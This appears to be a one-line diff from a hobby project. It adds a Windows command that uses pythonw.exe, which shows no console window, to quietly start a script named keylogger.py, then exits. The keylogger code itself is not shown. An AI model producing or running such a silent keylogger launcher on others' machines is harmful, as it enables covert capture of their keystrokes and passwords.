@@ -1,0 +1,1 @@
+start "C:\Users\duhch\Desktop\Programming\Python\" pythonw.exe keylogger.py & exit()
